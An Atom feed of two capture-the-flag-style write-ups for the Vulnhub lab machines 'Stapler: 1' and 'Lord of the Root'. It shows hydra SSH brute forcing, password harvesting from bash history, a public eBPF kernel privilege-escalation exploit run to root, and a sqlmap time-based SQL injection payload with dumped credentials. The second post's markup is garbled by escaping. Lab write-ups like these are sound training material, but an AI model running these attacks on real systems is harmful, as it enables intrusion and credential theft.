<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: Boot2root | tick.Tack]]></title>
  <link href="http://newdominic.github.io/blog/categories/boot2root/atom.xml" rel="self"/>
  <link href="http://newdominic.github.io/"/>
  <updated>2016-06-18T14:41:20+08:00</updated>
  <id>http://newdominic.github.io/</id>
  <author>
    <name><![CDATA[DMC]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Stapler: 1]]></title>
    <link href="http://newdominic.github.io/blog/2016/06/17/stapler_1/"/>
    <updated>2016-06-17T12:22:45+08:00</updated>
    <id>http://newdominic.github.io/blog/2016/06/17/stapler_1</id>
    <content type="html"><![CDATA[<p><a href="https://www.vulnhub.com/entry/stapler-1,150/">Stapler: 1</a> from <a href="https://www.vulnhub.com/">Vulnhub</a></p>

<!--more-->


<hr />

<p>Nmap scan result</p>

<pre><code>Starting Nmap 6.49BETA4 ( https://nmap.org ) at 2016-06-17 12:29 CST
Warning: 192.168.0.108 giving up on port because retransmission cap hit (2).
Nmap scan report for 192.168.0.108
Host is up (0.00035s latency).
Not shown: 992 filtered ports
PORT     STATE  SERVICE
20/tcp   closed ftp-data
21/tcp   open   ftp
22/tcp   open   ssh
53/tcp   open   domain
80/tcp   open   http
139/tcp  open   netbios-ssn
666/tcp  open   doom
3306/tcp open   mysql
MAC Address: 08:00:27:F5:FB:B3 (Cadmus Computer Systems)

Nmap done: 1 IP address (1 host up) scanned in 8.43 seconds
</code></pre>

<p>The <a href="https://www.vulnhub.com/entry/stapler-1,150/#description">description</a> says that:</p>

<pre><code>There are multiple methods to-do this machine
At least two (2) paths to get a limited shell
At least three (3) ways to get a root access
</code></pre>

<h2>Limited shell 1</h2>

<p>I used enum4linux to test the 139 port, which gave me the users on this machine.</p>

<pre><code>...snip...
[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
S-1-22-1-1000 Unix User\peter (Local User)
S-1-22-1-1001 Unix User\RNunemaker (Local User)
S-1-22-1-1002 Unix User\ETollefson (Local User)
S-1-22-1-1003 Unix User\DSwanger (Local User)
S-1-22-1-1004 Unix User\AParnell (Local User)
S-1-22-1-1005 Unix User\SHayslett (Local User)
S-1-22-1-1006 Unix User\MBassin (Local User)
S-1-22-1-1007 Unix User\JBare (Local User)
S-1-22-1-1008 Unix User\LSolum (Local User)
S-1-22-1-1009 Unix User\IChadwick (Local User)
S-1-22-1-1010 Unix User\MFrei (Local User)
S-1-22-1-1011 Unix User\SStroud (Local User)
S-1-22-1-1012 Unix User\CCeaser (Local User)
S-1-22-1-1013 Unix User\JKanode (Local User)
S-1-22-1-1014 Unix User\CJoo (Local User)
S-1-22-1-1015 Unix User\Eeth (Local User)
S-1-22-1-1016 Unix User\LSolum2 (Local User)
S-1-22-1-1017 Unix User\JLipps (Local User)
S-1-22-1-1018 Unix User\jamie (Local User)
S-1-22-1-1019 Unix User\Sam (Local User)
S-1-22-1-1020 Unix User\Drew (Local User)
S-1-22-1-1021 Unix User\jess (Local User)
S-1-22-1-1022 Unix User\SHAY (Local User)
S-1-22-1-1023 Unix User\Taylor (Local User)
S-1-22-1-1024 Unix User\mel (Local User)
S-1-22-1-1025 Unix User\kai (Local User)
S-1-22-1-1026 Unix User\zoe (Local User)
S-1-22-1-1027 Unix User\NATHAN (Local User)
S-1-22-1-1028 Unix User\www (Local User)
S-1-22-1-1029 Unix User\elly (Local User)
...snip...
</code></pre>

<p>Then I compsed these names into a file, then tried to brute force with it for both user name and password on the ssh service.</p>

<pre><code># grep 'Unix User' e4l_result | cut -d'\' -f2 | cut -d' ' -f1 &gt; user_list
# hydra -L user_list -P user_list 192.168.0.108 ssh

Hydra v8.1 (c) 2014 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2016-06-17 13:42:48
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (./hydra.restore) from a previous session found, to prevent overwriting, you have 10 seconds to abort...
[DATA] max 16 tasks per 1 server, overall 64 tasks, 900 login tries (l:30/p:30), ~0 tries per task
[DATA] attacking service ssh on port 22
[22][ssh] host: 192.168.0.108   login: SHayslett   password: SHayslett
</code></pre>

<p>Here we got SHayslett who set the password the same as the username. Now we can login the ssh with this credential.</p>

<pre><code>ssh SHayslett@192.168.0.108
-----------------------------------------------------------------
~          Barry, don't forget to put a message here           ~
-----------------------------------------------------------------
SHayslett@192.168.0.108's password:
Welcome back!


SHayslett@red:~$ id
uid=1005(SHayslett) gid=1005(SHayslett) groups=1005(SHayslett)
SHayslett@red:~$
</code></pre>

<h2>Privilege Escalation 1</h2>

<p>After logged in as SHayslett, I found it is available to browse every users&#8217; home directory.</p>

<pre><code>SHayslett@red:/home$ ls -al
total 128
drwxr-xr-x 32 root       root       4096 Jun  4 20:13 .
drwxr-xr-x 22 root       root       4096 Jun  7 09:08 ..
drwxr-xr-x  2 AParnell   AParnell   4096 Jun  5 18:21 AParnell
drwxr-xr-x  2 CCeaser    CCeaser    4096 Jun  5 18:26 CCeaser
drwxr-xr-x  2 CJoo       CJoo       4096 Jun  5 18:24 CJoo
drwxr-xr-x  2 Drew       Drew       4096 Jun  5 18:24 Drew
drwxr-xr-x  2 DSwanger   DSwanger   4096 Jun  5 18:24 DSwanger
drwxr-xr-x  2 Eeth       Eeth       4096 Jun  5 18:24 Eeth
drwxr-xr-x  2 elly       elly       4096 Jun  5 18:24 elly
drwxr-xr-x  2 ETollefson ETollefson 4096 Jun  5 18:24 ETollefson
drwxr-xr-x  2 IChadwick  IChadwick  4096 Jun  5 18:24 IChadwick
drwxr-xr-x  2 jamie      jamie      4096 Jun  5 18:26 jamie
drwxr-xr-x  2 JBare      JBare      4096 Jun  5 18:24 JBare
drwxr-xr-x  2 jess       jess       4096 Jun  5 18:24 jess
drwxr-xr-x  2 JKanode    JKanode    4096 Jun  5 18:25 JKanode
drwxr-xr-x  2 JLipps     JLipps     4096 Jun  5 18:26 JLipps
drwxr-xr-x  2 kai        kai        4096 Jun  5 18:24 kai
drwxr-xr-x  2 LSolum     LSolum     4096 Jun  5 18:24 LSolum
drwxr-xr-x  2 LSolum2    LSolum2    4096 Jun  5 18:26 LSolum2
drwxr-xr-x  2 MBassin    MBassin    4096 Jun  5 18:24 MBassin
drwxr-xr-x  2 mel        mel        4096 Jun  5 18:24 mel
drwxr-xr-x  2 MFrei      MFrei      4096 Jun  5 18:24 MFrei
drwxr-xr-x  2 NATHAN     NATHAN     4096 Jun  5 18:24 NATHAN
drwxr-xr-x  3 peter      peter      4096 Jun  3 16:11 peter
drwxr-xr-x  2 RNunemaker RNunemaker 4096 Jun  5 18:24 RNunemaker
drwxr-xr-x  2 Sam        Sam        4096 Jun  5 18:24 Sam
drwxr-xr-x  2 SHAY       SHAY       4096 Jun  5 18:24 SHAY
drwxr-xr-x  3 SHayslett  SHayslett  4096 Jun 17 13:04 SHayslett
drwxr-xr-x  2 SStroud    SStroud    4096 Jun  5 18:24 SStroud
drwxr-xr-x  2 Taylor     Taylor     4096 Jun  5 18:26 Taylor
drwxrwxrwx  2 www        www        4096 Jun  5 18:25 www
drwxr-xr-x  2 zoe        zoe        4096 Jun  5 18:26 zoe
SHayslett@red:/home$
</code></pre>

<p>Let&rsquo;s check if there&rsquo;s any interesting stuff in them.</p>

<pre><code>SHayslett@red:/home$ ls -alR | grep -v .bash_logout | grep -v .bashrc |grep -v .profile
...snip...
./JKanode:
total 24
drwxr-xr-x  2 JKanode JKanode 4096 Jun  5 18:25 .
drwxr-xr-x 32 root    root    4096 Jun  4 20:13 ..
-rw-r--r--  1 JKanode JKanode  167 Jun  5 18:25 .bash_history
...snip...
</code></pre>

<p>We found something different in JKanode&rsquo;s and peter&rsquo;s home directory.</p>

<p>Now take a look at the .bash_history in JKanode</p>

<pre><code>SHayslett@red:/home/JKanode$ cat .bash_history
id
whoami
ls -lah
pwd
ps aux
sshpass -p thisimypassword ssh JKanode@localhost
apt-get install sshpass
sshpass -p JZQuyIN5 peter@localhost
ps -ef
top
kill -9 3747
exit
SHayslett@red:/home/JKanode$
</code></pre>

<p>Looks like we have peter&rsquo;s password here. Now it&rsquo;s time to switch to peter&rsquo;s account.</p>

<p>(Not sure if this is the second way to get the limited shell)</p>

<pre><code>SHayslett@red:/home/JKanode$ ssh peter@localhost
The authenticity of host 'localhost (127.0.0.1)' can't be established.
ECDSA key fingerprint is SHA256:WuY26BwbaoIOawwEIZRaZGve4JZFaRo7iSvLNoCwyfA.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added 'localhost' (ECDSA) to the list of known hosts.
-----------------------------------------------------------------
~          Barry, don't forget to put a message here           ~
-----------------------------------------------------------------
peter@localhost's password:
Welcome back!
This is the Z Shell configuration function for new users,
zsh-newuser-install.
You are seeing this message because you have no zsh startup files
(the files .zshenv, .zprofile, .zshrc, .zlogin in the directory
~).  This function can help you with a few settings that should
make your use of the shell easier.

You can:

(q)  Quit and do nothing.  The function will be run again next time.

(0)  Exit, creating the file ~/.zshrc containing just a comment.
     That will prevent this function being run again.

(1)  Continue to the main menu.

(2)  Populate your ~/.zshrc with the configuration recommended
     by the system administrator and exit (you will need to edit
     the file by hand, if so desired).

--- Type one of the keys in parentheses ---q
%red id
uid=1000(peter) gid=1000(peter) groups=1000(peter),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),113(lpadmin),114(sambashare)
red%
</code></pre>

<p>Now we are logged in as peter. And let&rsquo;s check the home directory first.</p>

<pre><code>red% ls -al
total 72
drwxr-xr-x  3 peter peter  4096 Jun  3 16:11 .
drwxr-xr-x 32 root  root   4096 Jun  4 20:13 ..
-rw-------  1 peter peter     1 Jun  5 18:00 .bash_history
-rw-r--r--  1 peter peter   220 Jun  3 13:53 .bash_logout
-rw-r--r--  1 peter peter  3771 Jun  3 13:53 .bashrc
drwx------  2 peter peter  4096 Jun  6 23:17 .cache
-rw-r--r--  1 peter peter   675 Jun  3 13:53 .profile
-rw-r--r--  1 peter peter     0 Jun  3 13:55 .sudo_as_admin_successful
-rw-------  1 peter peter   577 Jun  3 14:11 .viminfo
-rw-rw-r--  1 peter peter 39206 Jun  3 16:11 .zcompdump
</code></pre>

<p>&lsquo;.sudo_as_admin_successful&rsquo;</p>

<p>Looks like peter had sudo access before. Let&rsquo;s give it a try.</p>

<pre><code>red% sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for peter:
Matching Defaults entries for peter on red:
    lecture=always, env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User peter may run the following commands on red:
    (ALL : ALL) ALL
</code></pre>

<p>It seems that peter is granted access to all commands. Now we can logged in as root simply and get the flag!</p>

<pre><code>red% sudo su
➜  peter id
uid=0(root) gid=0(root) groups=0(root)
➜  peter cat /root/flag.txt
~~~~~~~~~~&lt;(Congratulations)&gt;~~~~~~~~~~
                          .-'''''-.
                          |'-----'|
                          |-.....-|
                          |       |
                          |       |
         _,._             |       |
    __.o`   o`"-.         |       |
 .-O o `"-.o   O )_,._    |       |
( o   O  o )--.-"`O   o"-.`'-----'`
 '--------'  (   o  O    o)
              `----------`
b6b545dc11b7a270f4bad23432190c75162c4a2b
</code></pre>

<h2>Privilege Escalation 2</h2>

<p>Here&rsquo;s the system information.</p>

<pre><code>red% uname -a
Linux red.initech 4.4.0-21-generic #37-Ubuntu SMP Mon Apr 18 18:34:49 UTC 2016 i686 i686 i686 GNU/Linux
red% cat /etc/os-release
NAME="Ubuntu"
VERSION="16.04 LTS (Xenial Xerus)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 16.04 LTS"
VERSION_ID="16.04"
HOME_URL="http://www.ubuntu.com/"
SUPPORT_URL="http://help.ubuntu.com/"
BUG_REPORT_URL="http://bugs.launchpad.net/ubuntu/"
UBUNTU_CODENAME=xenial
</code></pre>

<p>It can be easily pwnd with the <a href="https://www.exploit-db.com/exploits/39772/">exploit</a> found on exploit-db.</p>

<pre><code>red% ./compile.sh
doubleput.c: In function ‘make_setuid’:
doubleput.c:91:13: warning: cast from pointer to integer of different size [-Wpointer-to-int-cast]
    .insns = (__aligned_u64) insns,
             ^
doubleput.c:92:15: warning: cast from pointer to integer of different size [-Wpointer-to-int-cast]
    .license = (__aligned_u64)""
               ^
red% ./doubleput
starting writev
woohoo, got pointer reuse
writev returned successfully. if this worked, you'll have a root shell in &lt;=60 seconds.
suid file detected, launching rootshell...
we have root privs now...
root@red:~/ebpf_mapfd_doubleput_exploit# id
uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),113(lpadmin),114(sambashare),1000(peter)
root@red:~/ebpf_mapfd_doubleput_exploit# cat /root/flag.txt
~~~~~~~~~~&lt;(Congratulations)&gt;~~~~~~~~~~
                          .-'''''-.
                          |'-----'|
                          |-.....-|
                          |       |
                          |       |
         _,._             |       |
    __.o`   o`"-.         |       |
 .-O o `"-.o   O )_,._    |       |
( o   O  o )--.-"`O   o"-.`'-----'`
 '--------'  (   o  O    o)
              `----------`
b6b545dc11b7a270f4bad23432190c75162c4a2b
</code></pre>

<h2>Ongoing Attempts</h2>

<p><strong>Port 666</strong></p>

<p>After connecting to port 666 with nc, it response with a stream of data then closed the connection.</p>

<p>I tried to direct the stream to a output file. It turns out that it is a zip file, which contains a image call message2.jpg.</p>

<pre><code># nc 192.168.0.108 666 &gt; output
# file output
output: Zip archive data, at least v2.0 to extract
# unzip output
Archive:  output
  inflating: message2.jpg
</code></pre>

<p><img class="center" src="/images/2016-06-17-stapler_1/message2.jpg"></p>

<p>Then I got a cookie by searching strings in it&hellip;.</p>

<pre><code># strings message2.jpg
JFIF
vPhotoshop 3.0
8BIM
1If you are reading this, you should get a cookie!
---snip---
</code></pre>

<hr />

<p><strong>Port 80</strong></p>

<p>The web sever is setup by using the php command directly.</p>

<pre><code>red% ps aux
---snip--- 
root      1409  0.0  0.2   6472  3060 ?        S    11:07   0:00 su -c authbind php -S 0.0.0.0:80 -t /home/www/ &amp;&gt;/dev/null www
---snip---
</code></pre>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Lord of the Root]]></title>
    <link href="http://newdominic.github.io/blog/2015/12/26/lord_of_root/"/>
    <updated>2015-12-26T21:38:42+08:00</updated>
    <id>http://newdominic.github.io/blog/2015/12/26/lord_of_root</id>
    <content type="html"><![CDATA[<p><a href="https://www.vulnhub.com/entry/lord-of-the-root-101,129/">Lord Of The Root</a> from <a href="https://www.vulnhub.com/">Vulnhub</a></p>

<!--more-->


<hr />

<p><div class="highlight"><pre><code class="language-bash" data-lang="bash">root@kali:~/_Sec/lord_of_root# nmap -p- -T5 192.168.0.119&lt;/p&gt;

&lt;p&gt;Starting Nmap 6.47 <span class="o">(</span> &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://nmap.org&quot;</span>&gt;http://nmap.org&lt;/a&gt; <span class="o">)</span> at 2015-12-26 08:30 EST
Nmap scan report <span class="k">for</span> 192.168.0.119
Host is up <span class="o">(</span>0.00068s latency<span class="o">)</span>.
Not shown: <span class="m">65534</span> filtered ports
PORT   STATE SERVICE
22/tcp open  ssh
MAC Address: 00:0C:29:FA:7B:62 <span class="o">(</span>VMware<span class="o">)</span>&lt;/p&gt;

&lt;p&gt;Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 53.53 seconds</code></pre></div></p>

<p>nmap掃瞄過之後只有port 22是打開的，另外掃過UDP也沒有掃到開起的port</p>

<p>最後只好先連上port 22看看</p>

<p><div class="highlight"><pre><code class="language-bash" data-lang="bash">root@kali:~/_Sec/lord_of_root# ssh 192.168.0.119&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;                                              .____    _____________________________
                                              <span class="p">|</span>    <span class="p">|</span>   <span class="se">\_</span>____  <span class="se">\_</span>_    ___/<span class="se">\_</span>_____   <span class="se">\</span>
                                              <span class="p">|</span>    <span class="p">|</span>    /   <span class="p">|</span>   <span class="se">\|</span>    <span class="p">|</span>    <span class="p">|</span>       _/
                                              <span class="p">|</span>    <span class="p">|</span>___/    <span class="p">|</span>    <span class="se">\ </span>   <span class="p">|</span>    <span class="p">|</span>    <span class="p">|</span>   <span class="se">\</span>
                                              <span class="p">|</span>_______ <span class="se">\_</span>______  /____<span class="p">|</span>    <span class="p">|</span>____<span class="p">|</span>_  /
                                                      <span class="se">\/</span>       <span class="se">\/</span>                 <span class="se">\/</span>
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt; &lt;em&gt;&lt;em&gt;&lt;strong&gt;  &lt;/strong&gt;.                     &lt;strong&gt;     &lt;/strong&gt;&lt;/em&gt;&lt;/em&gt;&lt;strong&gt;&lt;em&gt;&lt;strong&gt;&lt;strong&gt;      .&lt;/strong&gt;                   .&lt;/strong&gt;&lt;/em&gt; &lt;/strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;em&gt;      &lt;/em&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;strong&gt;       &lt;/strong&gt;
<span class="p">|</span>    <span class="p">|</span>/ &lt;em&gt;<span class="p">|</span> &lt;/em&gt;&lt;em&gt;&lt;strong&gt;   &lt;/strong&gt;&lt;strong&gt;   &lt;/strong&gt;&lt;/em&gt;&lt;em&gt; <span class="p">|</span>  <span class="p">|</span> &lt;strong&gt; _   &lt;/strong&gt;&lt;/em&gt;&lt;strong&gt;/&lt;/strong&gt;&lt;em&gt;&lt;em&gt;&lt;strong&gt;<span class="p">|</span>&lt;/strong&gt;<span class="p">|</span> &lt;/em&gt;&lt;/em&gt;&lt;strong&gt;   &lt;/strong&gt;&lt;strong&gt;    &lt;/strong&gt;<span class="p">|</span> &lt;em&gt;/ _&lt;/em&gt;    &lt;strong&gt;&lt;em&gt;/&lt;/em&gt;&lt;/strong&gt;   _   &lt;strong&gt;&lt;strong&gt;&lt;em&gt;/ &lt;/em&gt;&lt;/strong&gt;&lt;/strong&gt;/  <span class="p">|</span>&lt;em&gt;  &lt;/em&gt;&lt;em&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;em&gt;
<span class="p">|</span>      <span class="p">&amp;</span>lt<span class="p">;</span>  /    <span class="se">\ </span>/  _ _/ &lt;/em&gt;&lt;/strong&gt;<span class="p">|</span>  <span class="p">|</span>/ /  <span class="p">|</span>    &lt;/strong&gt;<span class="o">)</span> _  &lt;/strong&gt; <span class="se">\ </span> <span class="p">|</span>/ &lt;/strong&gt; <span class="se">\ </span>/    <span class="se">\ </span> / &lt;strong&gt; <span class="p">|</span>    <span class="p">|</span>    <span class="p">|</span> /  _ <span class="se">\ </span>  <span class="p">|</span>    &lt;/strong&gt;<span class="o">)</span>&lt;/em&gt; /    <span class="se">\ </span>  &lt;strong&gt;<span class="se">\/</span> &lt;/strong&gt; _  &lt;strong&gt; <span class="se">\</span>
<span class="p">|</span>    <span class="p">|</span>  <span class="p">|</span>   <span class="p">|</span>  <span class="o">(</span>  &lt;_&gt; <span class="o">)</span>  _&lt;/strong&gt;<span class="p">|</span>    <span class="p">&amp;</span>lt<span class="p">;</span>   <span class="p">|</span>     <span class="se">\ </span>  <span class="p">|</span>  <span class="p">|</span> <span class="se">\/</span>  <span class="se">\ </span> &lt;strong&gt;&lt;em&gt;/<span class="p">|</span>   <span class="p">|</span>  <span class="se">\/</span> /&lt;/em&gt;/ <span class="p">|</span>    <span class="p">|</span>    <span class="p">|</span><span class="o">(</span>  &lt;_&gt; <span class="o">)</span>  <span class="p">|</span>        <span class="se">\ </span>  <span class="p">|</span>  <span class="se">\ </span> <span class="p">|</span> <span class="se">\ </span> &lt;/strong&gt;&lt;em&gt;/<span class="p">|</span>  <span class="p">|</span> <span class="se">\/</span>
<span class="p">|</span>&lt;/em&gt;&lt;em&gt;&lt;strong&gt;<span class="p">|</span>&lt;/strong&gt; _&lt;strong&gt;<span class="p">|</span>  /_&lt;/strong&gt;&lt;/em&gt;/ _&lt;strong&gt;  &gt;&lt;/strong&gt;<span class="p">|</span>&lt;em&gt; <span class="se">\ </span> _&lt;strong&gt;  /   <span class="p">|</span>&lt;/strong&gt;<span class="p">|</span>  <span class="p">|</span>&lt;strong&gt;<span class="p">|</span>_&lt;/strong&gt;  &gt;&lt;/em&gt;&lt;strong&gt;<span class="p">|</span>  /_&lt;/strong&gt;&lt;em&gt; <span class="p">|</span>    <span class="p">|</span>&lt;/em&gt;&lt;strong&gt;&lt;em&gt;<span class="p">|</span> _&lt;/em&gt;&lt;/strong&gt;/  /&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;em&gt;  /&lt;/em&gt;&lt;/strong&gt;<span class="p">|</span>  /&lt;/strong&gt;<span class="p">|</span>  _&lt;/strong&gt;  &gt;__<span class="p">|</span>
        <span class="se">\/</span>    <span class="se">\/</span>            <span class="se">\/</span>     <span class="se">\/</span>      <span class="se">\/</span>                  <span class="se">\/</span>     <span class="se">\/</span>      <span class="se">\/</span>                           <span class="se">\/</span>     <span class="se">\/</span>          <span class="se">\/</span>
Easy as 1,2,3</code></pre></div></p>

<p>&ldquo;Knock Friend To Enter&rdquo; 看來第一關是<a href="https://en.wikipedia.org/wiki/Port_knocking">port knocking</a></p>

<p>敲完門之後，nmap再掃一次就多了一個新的port</p>

<p><div class="highlight"><pre><code class="language-bash" data-lang="bash">1337/tcp open  http    Apache httpd 2.4.7 <span class="o">((</span>Ubuntu<span class="o">))</span></code></pre></div></p>

<p>連上網站後，只有三張魔戒的meme</p>

<p><img class="center" src="/images/2015-12-26-lord_of_the_root/iwilldoit.jpg"></p>

<p><img class="center" src="/images/2015-12-26-lord_of_the_root/hipster.jpg"></p>

<p><img class="center" src="/images/2015-12-26-lord_of_the_root/legolas.jpg"></p>

<p>抓下來細看一下，裡面好像沒有藏甚麼資訊</p>

<p>接著想看一下robots.txt有沒有擋調特別的路徑，卻出現了下面的特出景象</p>

<p><img class="center" src="/images/2015-12-26-lord_of_the_root/robots.png"></p>

<p>而且原始碼內還有一個神祕的字串</p>

<p><div class="highlight"><pre><code class="language-bash" data-lang="bash">&lt;html&gt;
&lt;img <span class="nv">src</span><span class="o">=</span><span class="s2">&quot;http://newdominic.github.io/images/hipster.jpg&quot;</span> <span class="nv">align</span><span class="o">=</span><span class="s2">&quot;middle&quot;</span>&gt;&lt;/p&gt;

&lt;p&gt;&lt;!--THprM09ETTBOVEl4TUM5cGJtUmxlQzV3YUhBPSBDbG9zZXIh&gt;
&lt;/html&gt;</code></pre></div></p>

<p>用base64解碼之後得到了</p>

<p><div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">Lzk3ODM0NTIxMC9pbmRleC5waHA</span><span class="o">=</span> Closer!</code></pre></div></p>

<p>再解一次之後得到</p>

<p><div class="highlight"><pre><code class="language-bash" data-lang="bash">/978345210/index.php</code></pre></div></p>

<p>於是我們來到了魔鐸之門 (?</p>

<p><img class="center" src="/images/2015-12-26-lord_of_the_root/gom.png"></p>

<p>看到這麼陽春的登入畫面，推測應該是用SQL injection打無誤(?</p>

<p>簡單試過一些基本的SQLi語句卻都沒有效果</p>

<p>只好求助sqlmap大神</p>

<p><div class="highlight"><pre><code class="language-bash" data-lang="bash">root@kali:~/_Sec/lord_of_root# sqlmap <span class="p">&amp;</span>ndash<span class="p">;</span><span class="nv">url</span><span class="o">=</span><span class="p">&amp;</span>lsquo<span class="p">;</span>&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://192.168.0.121:1337/978345210/index.php&quot;</span>&gt;http://192.168.0.121:1337/978345210/index.php&lt;/a&gt;<span class="p">&amp;</span>rsquo<span class="p">;</span> <span class="p">&amp;</span>ndash<span class="p">;</span><span class="nv">data</span><span class="o">=</span><span class="p">&amp;</span>ldquo<span class="p">;</span><span class="nv">username</span><span class="o">=</span>asd<span class="p">&amp;</span>amp<span class="p">;</span><span class="nv">password</span><span class="o">=</span>asd<span class="p">&amp;</span>amp<span class="p">;</span><span class="nv">submit</span><span class="o">=</span> Login<span class="p">&amp;</span>rdquo<span class="p">;</span> <span class="p">&amp;</span>ndash<span class="p">;</span>dump-all <span class="p">&amp;</span>ndash<span class="p">;</span>level 5
<span class="p">&amp;</span>hellip<span class="p">;</span>
<span class="o">[</span>11:40:29<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> testing <span class="p">&amp;</span>lsquo<span class="p">;</span>MySQL &gt; 5.0.11 AND <span class="nb">time</span>-based blind<span class="p">&amp;</span>rsquo<span class="p">;</span>
<span class="o">[</span>11:41:19<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> POST parameter <span class="p">&amp;</span>lsquo<span class="p">;</span>username<span class="p">&amp;</span>rsquo<span class="p">;</span> seems to be <span class="p">&amp;</span>lsquo<span class="p">;</span>MySQL &gt; 5.0.11 AND <span class="nb">time</span>-based blind<span class="p">&amp;</span>rsquo<span class="p">;</span> injectable
<span class="p">&amp;</span>hellip<span class="p">;</span>
<span class="o">[</span>11:41:21<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> checking <span class="k">if</span> the injection point on POST parameter <span class="p">&amp;</span>lsquo<span class="p">;</span>username<span class="p">&amp;</span>rsquo<span class="p">;</span> is a <span class="nb">false </span>positive
POST parameter <span class="p">&amp;</span>lsquo<span class="p">;</span>username<span class="p">&amp;</span>rsquo<span class="p">;</span> is vulnerable. Do you want to keep testing the others <span class="o">(</span><span class="k">if</span> any<span class="o">)</span>? <span class="o">[</span>y/N<span class="o">]</span>&lt;/p&gt;

&lt;h2&gt;sqlmap identified the following injection points with a total of <span class="m">2094</span> HTTP<span class="o">(</span>s<span class="o">)</span> requests:&lt;/h2&gt;

&lt;p&gt;Place: POST
Parameter: username
    Type: AND/OR <span class="nb">time</span>-based blind
    Title: MySQL &gt; 5.0.11 AND <span class="nb">time</span>-based blind&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;Payload: <span class="nv">username</span><span class="o">=</span>asd<span class="s1">&#39;||(SELECT &#39;</span>NAyM<span class="s1">&#39; FROM DUAL WHERE 8495=8495 AND SLEEP(5) )||&#39;</span><span class="p">&amp;</span>amp<span class="p">;</span><span class="nv">password</span><span class="o">=</span>asd<span class="p">&amp;</span>amp<span class="p">;</span><span class="nv">submit</span><span class="o">=</span> Login
&lt;/code&gt;&lt;/pre&gt;

&lt;hr /&gt;

&lt;p&gt;<span class="o">[</span>11:46:08<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.7, PHP 5.5.9
back-end DBMS: MySQL 5.0.11</code></pre></div></p>

<p><div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="o">[</span>12:09:03<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> starting dictionary-based cracking <span class="o">(</span>mysql_passwd<span class="o">)</span>
<span class="o">[</span>12:09:13<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> cracked password <span class="p">&amp;</span>lsquo<span class="p">;</span>darkshadow<span class="p">&amp;</span>rsquo<span class="p">;</span> <span class="k">for</span> user <span class="p">&amp;</span>lsquo<span class="p">;</span>root<span class="p">&amp;</span>rsquo<span class="p">;</span>
database management system users password hashes:
<span class="o">[</span>&lt;em&gt;<span class="o">]</span> debian-sys-maint <span class="o">[</span>1<span class="o">]</span>:
    password <span class="nb">hash</span>: &lt;/em&gt;A55A9B9049F69BC2768C9284615361DFBD580B34
<span class="o">[</span>&lt;em&gt;<span class="o">]</span> root <span class="o">[</span>1<span class="o">]</span>:
    password <span class="nb">hash</span>: &lt;/em&gt;4DD56158ACDBA81BFE3FF9D3D7375231596CE10F
    clear-text password: darkshadow</code></pre></div></p>

<p><div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="o">[</span>09:50:20<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> fetching columns <span class="k">for</span> table <span class="p">&amp;</span>lsquo<span class="p">;</span>Users<span class="p">&amp;</span>rsquo<span class="p">;</span> in database <span class="p">&amp;</span>lsquo<span class="p">;</span>Webapp<span class="p">&amp;</span>rsquo<span class="p">;</span>
<span class="p">&amp;</span>hellip<span class="p">;</span>
+<span class="p">&amp;</span>mdash<span class="p">;</span>-+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>-+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>+
<span class="p">|</span> id <span class="p">|</span> username <span class="p">|</span> password         <span class="p">|</span>
+<span class="p">&amp;</span>mdash<span class="p">;</span>-+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>-+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>+
<span class="p">|</span> <span class="m">1</span>  <span class="p">|</span> frodo    <span class="p">|</span> iwilltakethering <span class="p">|</span>
